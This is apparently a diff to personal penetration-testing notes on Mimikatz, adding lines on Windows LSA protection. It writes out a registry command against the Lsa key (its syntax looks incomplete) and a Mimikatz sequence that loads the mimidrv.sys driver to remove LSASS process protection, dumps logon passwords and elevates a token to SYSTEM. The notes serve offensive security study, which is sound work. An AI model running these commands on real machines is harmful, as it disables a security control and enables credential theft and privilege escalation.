@@ -10,6 +10,19 @@ Used in Post Privilege Esculation in maintaining [[Persistence]] through credent
 	- [[Pass-The-Ticket]]
 - And more
 
+In 2012, Microsoft implemented an LSA protection, to keep LSASS from being accessed to extract credentials from memory. [[AD-Credential-Harvesting]]
+`reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa 0`
+
+```powershell
+privilege::debug
+sekurlsa::logonpasswords
+# ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
+# Means LSA protection:
+!+ # mimidrv.sys driver disables LSA protection.
+!processprotect /process:lsass.exe /remove
+```
+
+
 ```powershell
 privilege::debug # enables the _SeDebugPrivilge_ access right
 token::elevate # elevate the security token Administrator -> SYSTEM
